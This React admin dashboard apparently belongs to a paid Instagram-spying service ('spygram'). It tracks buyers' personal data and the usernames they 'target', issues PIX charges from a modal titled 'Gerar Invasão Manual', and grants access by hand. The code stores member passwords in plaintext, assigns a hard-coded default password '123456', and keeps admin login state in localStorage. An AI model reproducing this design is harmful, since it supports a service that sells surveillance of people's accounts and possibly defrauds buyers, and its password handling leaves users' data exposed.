import React, { useEffect, useState, useMemo, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '../integrations/supabase/client';
import { 
  Users, DollarSign, Search, ShieldCheck, 
  CreditCard, LogOut, RotateCcw,
  Trash2, MessageCircle, Key, BarChart3, 
  Map as MapIcon, QrCode, Download, X, FileText, CheckCircle2, Lock
} from 'lucide-react';
import { 
  XAxis, YAxis, CartesianGrid, 
  Tooltip, ResponsiveContainer, AreaChart, Area 
} from 'recharts';
import { motion, AnimatePresence } from 'framer-motion';
import Loader from '../components/Loader';
import toast from 'react-hot-toast';
import jsPDF from 'jspdf';
import html2canvas from 'html2canvas';

interface Lead {
  id: string;
  username_searched: string;
  full_name: string;
  profile_pic: string;
  email: string;
  phone: string;
  document: string;
  status: string;
  total_amount: number;
  city: string;
  state: string;
  user_agent: string;
  created_at: string;
  updated_at: string;
}

const AdminPage: React.FC = () => {
  const navigate = useNavigate();
  const [leads, setLeads] = useState<Lead[]>([]);
  const [loading, setLoading] = useState(true);
  const [activeTab, setActiveTab] = useState<'leads' | 'analytics' | 'sales'>('leads');
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState('all');
  
  // Estados para PIX
  const [showPixModal, setShowPixModal] = useState(false);
  const [selectedLead, setSelectedLead] = useState<Lead | null>(null);
  const [pixAmount, setPixAmount] = useState('29.90');
  const [generatedPix, setGeneratedPix] = useState<any>(null);
  const [pixLoading, setPixLoading] = useState(false);
  
  // Estados para Senha
  const [showPasswordModal, setShowPasswordModal] = useState(false);
  const [newPassword, setNewPassword] = useState('');
  const [passwordLoading, setPasswordLoading] = useState(false);

  const pixPdfRef = useRef<HTMLDivElement>(null);

  const fetchLeads = async (silent = false) => {
    if (!silent) setLoading(true);
    try {
      const { data, error } = await supabase
        .from('leads')
        .select('*')
        .order('created_at', { ascending: false });

      if (error) throw error;
      setLeads(data || []);
      if (silent) toast.success('Dados sincronizados!');
    } catch (error: any) {
      toast.error('Erro de conexão com o banco');
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchLeads();
    const channel = supabase
      .channel('admin-realtime')
      .on('postgres_changes', { event: '*', schema: 'public', table: 'leads' }, () => {
        fetchLeads(true);
      })
      .subscribe();
    return () => { supabase.removeChannel(channel); };
  }, []);

  const handleLiberateAccess = async (lead: Lead) => {
    if (!lead.email) {
      toast.error("Lead sem e-mail registrado.");
      return;
    }

    if (!window.confirm(`Deseja LIBERAR ACESSO manual para @${lead.username_searched}?`)) return;

    try {
      // 1. Atualiza status no lead
      const { error: leadError } = await supabase
        .from('leads')
        .update({ status: 'pagou' })
        .eq('id', lead.id);

      if (leadError) throw leadError;

      // 2. Garante que exista na tabela de membros (senha padrão 123456)
      const { data: memberExists } = await supabase
        .from('members')
        .select('id')
        .eq('email', lead.email)
        .single();

      if (!memberExists) {
        await supabase.from('members').insert({
          email: lead.email,
          password: '123456'
        });
      }

      toast.success("Acesso Liberado!");
      fetchLeads(true);
    } catch (err) {
      toast.error("Erro ao liberar acesso.");
    }
  };

  const handleUpdatePassword = async () => {
    if (!selectedLead || !newPassword) return;
    setPasswordLoading(true);

    try {
      const { error } = await supabase
        .from('members')
        .update({ password: newPassword.trim() })
        .eq('email', selectedLead.email);

      if (error) throw error;

      toast.success("Senha alterada com sucesso!");
      setShowPasswordModal(false);
      setNewPassword('');
    } catch (err) {
      toast.error("Membro não encontrado ou erro no banco.");
    } finally {
      setPasswordLoading(false);
    }
  };

  const handleDeleteLead = async (id: string) => {
    if (!window.confirm("Deseja realmente excluir este lead permanentemente?")) return;
    
    try {
      const { error } = await supabase.functions.invoke('delete-lead', {
        body: { leadId: id },
      });

      if (error) throw error;
      toast.success("Lead excluído.");
      fetchLeads(true);
    } catch (err) {
      toast.error("Erro ao excluir.");
    }
  };

  // Métricas
  const metrics = useMemo(() => {
    const total = leads.length || 0;
    const paid = leads.filter(l => l.status === 'pagou');
    const revenue = paid.reduce((acc, curr) => acc + (Number(curr.total_amount) || 0), 0);
    
    const geoMap: Record<string, { count: number, cities: Record<string, number> }> = {};
    leads.forEach(l => {
      const st = l.state || 'Outros';
      const ct = l.city || 'Desconhecida';
      if (!geoMap[st]) geoMap[st] = { count: 0, cities: {} };
      geoMap[st].count++;
      geoMap[st].cities[ct] = (geoMap[st].cities[ct] || 0) + 1;
    });

    const geoData = Object.entries(geoMap)
      .map(([uf, data]) => ({
        uf,
        count: data.count,
        percent: total > 0 ? ((data.count / total) * 100).toFixed(1) : "0",
        mainCities: Object.entries(data.cities).sort((a, b) => b[1] - a[1]).slice(0, 3).map(([c, n]) => `${c} (${n})`).join(' • ')
      }))
      .sort((a, b) => b.count - a.count);

    const chartData = Array.from({ length: 7 }, (_, i) => {
      const d = new Date();
      d.setDate(d.getDate() - i);
      const dateStr = d.toISOString().split('T')[0];
      const amount = paid.filter(l => l.updated_at?.startsWith(dateStr)).reduce((a, c) => a + Number(c.total_amount), 0);
      return { date: dateStr.split('-').reverse().slice(0, 2).join('/'), amount };
    }).reverse();

    return { total, paidCount: paid.length, revenue, geoData, chartData };
  }, [leads]);

  const filteredLeads = useMemo(() => {
    const searchLower = searchTerm.toLowerCase().trim();
    return leads.filter(lead => {
      const matchesSearch = searchLower === '' || 
        (lead.username_searched || '').toLowerCase().includes(searchLower) ||
        (lead.email || '').toLowerCase().includes(searchLower);
      const matchesStatus = statusFilter === 'all' || lead.status === statusFilter;
      return matchesSearch && matchesStatus;
    });
  }, [leads, searchTerm, statusFilter]);

  const handleGeneratePix = async () => {
    if (!selectedLead) return;
    setPixLoading(true);
    try {
      const { data, error } = await supabase.functions.invoke('royal-banking-payment', {
        body: { 
          name: selectedLead.full_name || selectedLead.username_searched,
          email: selectedLead.email,
          document: selectedLead.document,
          phone: selectedLead.phone,
          amount: parseFloat(pixAmount),
          leadId: selectedLead.id
        },
      });
      if (error || !data.paymentCode) throw new Error('Falha');
      setGeneratedPix(data);
      toast.success('PIX Gerado');
    } catch (err) {
      toast.error('Erro');
    } finally {
      setPixLoading(false);
    }
  };

  if (loading) return (
    <div className="min-h-screen bg-[#0f0f12] flex flex-col items-center justify-center gap-4">
      <Loader />
    </div>
  );

  return (
    <div className="min-h-screen bg-[#0f0f12] text-gray-200 font-sans selection:bg-purple-500/30">
      <div className="fixed inset-0 pointer-events-none z-0">
        <div className="absolute top-[-10%] left-[-10%] w-[50%] h-[50%] bg-purple-900/10 blur-[150px] rounded-full" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[50%] h-[50%] bg-blue-900/10 blur-[150px] rounded-full" />
      </div>

      <div className="relative z-10 p-4 md:p-8 max-w-7xl mx-auto">
        <header className="mb-12 flex flex-col lg:flex-row justify-between items-start lg:items-center gap-8 border-b border-white/5 pb-8">
          <div>
            <div className="flex items-center gap-4 mb-4">
              <div className="p-3 bg-white/5 border border-white/10 rounded-2xl">
                <ShieldCheck className="w-6 h-6 text-purple-500" />
              </div>
              <h1 className="text-2xl font-black text-white uppercase tracking-tighter">Command Center</h1>
            </div>
            
            <nav className="flex gap-2">
              <TabButton active={activeTab === 'leads'} onClick={() => setActiveTab('leads')} icon={Users} label="Leads" />
              <TabButton active={activeTab === 'analytics'} onClick={() => setActiveTab('analytics')} icon={MapIcon} label="Geolocalização" />
              <TabButton active={activeTab === 'sales'} onClick={() => setActiveTab('sales')} icon={BarChart3} label="Vendas" />
            </nav>
          </div>

          <div className="flex items-center gap-4">
            <div className="px-6 py-4 bg-white/5 border border-white/10 rounded-3xl backdrop-blur-3xl shadow-2xl">
               <span className="text-[9px] font-black text-gray-500 uppercase tracking-widest block mb-1">Faturamento Total</span>
               <span className="text-2xl font-black text-green-500">R$ {metrics.revenue.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
            </div>
            <button onClick={() => { localStorage.removeItem('spygram_admin_auth'); navigate('/admin-login'); }} className="p-5 bg-red-600/10 border border-red-600/20 text-red-500 rounded-2xl hover:bg-red-600/20 transition-all">
              <LogOut size={22} />
            </button>
          </div>
        </header>

        {activeTab === 'leads' && (
          <section className="bg-white/[0.03] border border-white/10 rounded-[2.5rem] p-6 backdrop-blur-3xl shadow-2xl overflow-hidden">
            <div className="flex flex-col md:flex-row gap-4 mb-8">
              <div className="relative flex-1">
                <Search className="absolute left-5 top-1/2 -translate-y-1/2 w-4 h-4 text-gray-500" />
                <input 
                  type="text" 
                  placeholder="Pesquisar..." 
                  value={searchTerm}
                  onChange={(e) => setSearchTerm(e.target.value)}
                  className="w-full bg-black/40 border border-white/10 rounded-2xl py-4 pl-14 pr-6 text-sm focus:border-purple-500 outline-none"
                />
              </div>
              <select 
                value={statusFilter}
                onChange={(e) => setStatusFilter(e.target.value)}
                className="bg-black/40 border border-white/10 rounded-2xl py-4 px-6 text-[10px] font-black uppercase outline-none"
              >
                <option value="all">Todos Status</option>
                <option value="pesquisou">Pesquisou</option>
                <option value="gerou_pix">Gerou PIX</option>
                <option value="pagou">Pago</option>
              </select>
              <button onClick={() => fetchLeads(true)} className="p-4 bg-white/5 border border-white/10 rounded-2xl hover:bg-white/10">
                <RotateCcw size={20} />
              </button>
            </div>

            <div className="overflow-x-auto">
              <table className="w-full text-left">
                <thead>
                  <tr className="text-[10px] text-gray-600 uppercase font-black border-b border-white/5">
                    <th className="pb-4 px-4">Alvo</th>
                    <th className="pb-4 px-4">Lead</th>
                    <th className="pb-4 px-4">Status</th>
                    <th className="pb-4 px-4 text-center">Ações</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/[0.03]">
                  {filteredLeads.map((lead) => (
                    <tr key={lead.id} className="group hover:bg-white/[0.02] transition-colors">
                      <td className="py-5 px-4">
                        <div className="flex items-center gap-4">
                          <img src={lead.profile_pic || '/perfil.jpg'} className="w-10 h-10 rounded-xl object-cover border border-white/10" />
                          <p className="text-sm font-black text-white tracking-tight">@{lead.username_searched}</p>
                        </div>
                      </td>
                      <td className="py-5 px-4">
                        <p className="text-xs font-black text-gray-300 uppercase truncate max-w-[150px]">{lead.full_name || 'Anônimo'}</p>
                        <p className="text-[11px] text-gray-500 lowercase">{lead.email || '---'}</p>
                      </td>
                      <td className="py-5 px-4">
                        <span className={`text-[9px] font-black px-3 py-1.5 rounded-full uppercase tracking-widest border ${
                          lead.status === 'pagou' ? 'bg-green-500/10 text-green-400 border-green-500/20' :
                          lead.status === 'gerou_pix' ? 'bg-pink-500/10 text-pink-400 border-pink-500/20' : 'bg-gray-800/50 text-gray-500'
                        }`}>
                          {lead.status}
                        </span>
                      </td>
                      <td className="py-5 px-4">
                        <div className="flex items-center justify-center gap-2">
                          <ActionButton onClick={() => handleLiberateAccess(lead)} icon={CheckCircle2} color="text-green-500" title="Liberar Acesso" />
                          <ActionButton onClick={() => { setSelectedLead(lead); setShowPasswordModal(true); }} icon={Lock} color="text-orange-400" title="Trocar Senha" />
                          <ActionButton onClick={() => { setSelectedLead(lead); setShowPixModal(true); setGeneratedPix(null); }} icon={QrCode} color="text-yellow-500" title="Gerar PIX" />
                          <ActionButton onClick={() => handleDeleteLead(lead.id)} icon={Trash2} color="text-red-500" title="Excluir" />
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </section>
        )}

        {/* MODAL TROCAR SENHA */}
        <AnimatePresence>
          {showPasswordModal && (
            <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/95 backdrop-blur-md">
              <motion.div initial={{ scale: 0.9 }} animate={{ scale: 1 }} className="bg-[#0f0f12] border border-white/10 w-full max-w-sm rounded-[2.5rem] p-8">
                <div className="flex justify-between items-center mb-8">
                  <h3 className="text-xl font-black text-white uppercase tracking-tighter">Alterar Senha</h3>
                  <button onClick={() => setShowPasswordModal(false)} className="p-2 bg-white/5 rounded-full"><X size={20} /></button>
                </div>
                <div className="space-y-6">
                  <div>
                    <p className="text-[10px] text-gray-500 uppercase font-black mb-2">Lead: {selectedLead?.email}</p>
                    <input 
                      type="text" 
                      placeholder="Nova senha de acesso"
                      value={newPassword}
                      onChange={(e) => setNewPassword(e.target.value)}
                      className="w-full bg-black/40 border border-white/10 rounded-xl py-4 px-6 text-white outline-none focus:border-orange-500"
                    />
                  </div>
                  <button 
                    onClick={handleUpdatePassword}
                    disabled={passwordLoading}
                    className="w-full bg-orange-600 text-white font-black py-4 rounded-xl shadow-lg active:scale-95 transition-all"
                  >
                    {passwordLoading ? "Salvando..." : "ATUALIZAR SENHA"}
                  </button>
                </div>
              </motion.div>
            </div>
          )}
        </AnimatePresence>

        {/* MODAL PIX (Simplificado p/ context) */}
        <AnimatePresence>
          {showPixModal && (
            <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/95 backdrop-blur-md">
              <motion.div initial={{ scale: 0.9 }} animate={{ scale: 1 }} className="bg-[#0f0f12] border border-white/10 w-full max-w-md rounded-[2.5rem] p-8">
                <div className="flex justify-between items-center mb-8">
                  <h3 className="text-xl font-black text-white uppercase tracking-tighter">Gerar Invasão Manual</h3>
                  <button onClick={() => setShowPixModal(false)} className="p-2 bg-white/5 rounded-full"><X size={20} /></button>
                </div>
                {!generatedPix ? (
                  <div className="space-y-6">
                    <input 
                      type="number" 
                      value={pixAmount}
                      onChange={(e) => setPixAmount(e.target.value)}
                      className="w-full bg-black/40 border border-white/10 rounded-xl py-4 px-6 text-white text-2xl font-black outline-none"
                    />
                    <button onClick={handleGeneratePix} disabled={pixLoading} className="w-full bg-white text-black font-black py-4 rounded-xl">
                      {pixLoading ? "Gerando..." : "GERAR QR CODE"}
                    </button>
                  </div>
                ) : (
                  <div className="text-center">
                    <div className="bg-white p-4 rounded-2xl inline-block mb-6">
                       <img src={`data:image/png;base64,${generatedPix.paymentCodeBase64}`} alt="QR" className="w-40 h-40" />
                    </div>
                    <button onClick={() => { navigator.clipboard.writeText(generatedPix.paymentCode); toast.success('Copiado'); }} className="w-full bg-purple-600 py-3 rounded-xl font-bold">COPIAR CÓDIGO</button>
                  </div>
                )}
              </motion.div>
            </div>
          )}
        </AnimatePresence>

      </div>
    </div>
  );
};

const TabButton = ({ active, onClick, icon: Icon, label }: any) => (
  <button onClick={onClick} className={`flex items-center gap-3 px-6 py-3 rounded-2xl transition-all font-black text-[10px] uppercase tracking-[0.2em] border ${active ? 'bg-white text-black border-white' : 'bg-white/5 text-gray-500 border-white/5'}`}>
    <Icon size={14} /> {label}
  </button>
);

const ActionButton = ({ onClick, icon: Icon, color, title }: any) => (
  <button onClick={onClick} title={title} className={`p-3 bg-white/5 border border-white/10 rounded-2xl transition-all hover:bg-white/10 ${color}`}>
    <Icon size={18} />
  </button>
);

export default AdminPage;